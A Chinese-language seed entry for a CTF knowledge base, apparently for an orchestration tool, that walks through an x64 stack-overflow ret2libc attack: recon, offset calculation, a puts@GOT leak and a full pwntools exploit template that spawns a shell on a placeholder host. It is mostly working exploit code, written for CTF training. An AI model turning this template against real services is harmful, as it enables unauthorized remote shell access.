# [种子] CTF Pwn — x64 栈溢出 + ROP 链调用 system

## 场景分类
CTF / 二进制利用

## 目标概述
一个 64 位 ELF，存在 `read()` 越界写入栈缓冲区。本机有 NX（不可执行栈）但无 PIE，无 stack canary。利用 ROP gadget 调用 libc 的 `system("/bin/sh")` 拿 shell。

## 完整执行链路

1. 基础侦察
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. 用 IDA / Ghidra 看 main → 发现 `read(0, buf, 0x100)` 但 `buf` 只有 0x40 字节
3. 计算溢出偏移
   ```bash
   pwndbg> cyclic 200
   # 输入到目标程序，崩溃后看 RSP
   pwndbg> cyclic -l 0x6161616c
   # 偏移 = 72
   ```
4. 由于没 PIE，PLT 和 GOT 都是固定地址
5. 第一阶段（无 libc 信息）：泄漏 `puts@GOT` 内容算 libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # 回到 main 二次利用
   ```
6. 接收 puts 输出，定位 libc 版本（用 libc-database 查询）
7. 第二阶段：构造 system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. 拿 shell → cat flag

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| ROP 调用 system 后程序崩溃，没 shell | 栈未对齐到 16 字节（Ubuntu 18.04+ 对 movaps 严格） | system 前加一个 ret gadget 做 padding | 30min |
| 本地能打通，远程打不通 | libc 版本不一致 | 用 puts 泄漏一个函数地址 → 上 libc-database 查精确版本 | 40min |
| pwntools recv 卡住 | 程序输出用了 setbuf(NULL) 但远程未关闭 stderr 缓冲 | 用 sendlineafter / recvuntil 精确同步 | 15min |
| 一打远程就 SIGPIPE | 第二阶段 payload 还在使用上一轮的 io 对象 | 用 `process` / `remote` 之后 io 必须复用同一个连接，主进程死了就完了 | 20min |
| ROPgadget 输出太多 | 工具默认列所有 gadget | `ROPgadget --binary vuln --only "pop\|ret"` 过滤 | 5min |

## 工具链发现

- **pwntools** 是 Python 写 exploit 的事实标准（`from pwn import *`）
- **pwndbg** 比 GDB 自带的强 10 倍（带 cyclic / vmmap / heap 命令）
- **ROPgadget** vs **ropper**：ropper 输出更友好，支持搜索 syscall chain
- **libc-database** 通过泄漏的 1 个 libc 函数地址匹配确切 libc 版本
- **one_gadget** 找一个能直接 execve("/bin/sh") 的 libc gadget，比手动 ROP 更短

## 关键代码/命令

完整 exploit 模板：

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # 用于栈对齐

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## 对本包的改进建议

- CTF-Sandbox-Orchestrator 的 `competition-reverse-pwn` 应增加 `pwn-rop-cheatsheet.md`，把这个流程做成模板
- bootstrap manifest 加入 pwntools / pwndbg / one_gadget

## 可复用的模式/脚本片段

**ROP 利用决策树**：

```text
checksec → 看保护
├── 无 NX → shellcode 直接打 (古早做法)
├── NX + 无 PIE → ret2libc 经典
├── NX + PIE + 无 Canary → 先泄漏 PIE 基址 → ret2libc
├── 有 Canary → 先想办法泄漏 Canary（格式化字符串 / off-by-one）
└── Full RELRO + Canary + PIE → 难度大，常见手段：fork 不重 ASLR / __libc_start_main / SROP
```

**libc 泄漏 → 利用 标准两阶段 payload**：

```text
Stage 1: leak puts@GOT → 算 libc base → 回 main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## 进化动作
- [ ] CTF orchestrator 增加 pwn 速查页
- [ ] bootstrap-manifest 加入 pwntools / pwndbg / one_gadget
- [ ] reverse-engineering/tools-dynamic.md 引用本案例

## 环境信息
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg 最新, ROPgadget 7.x
- libc 版本: glibc 2.31 / 2.35（CTF 常见）
- 目标架构: x86_64

## 脱敏要求
本条目为种子数据，基于公开 CTF 技术模式编写，不涉及任何真实赛题或闭源系统。
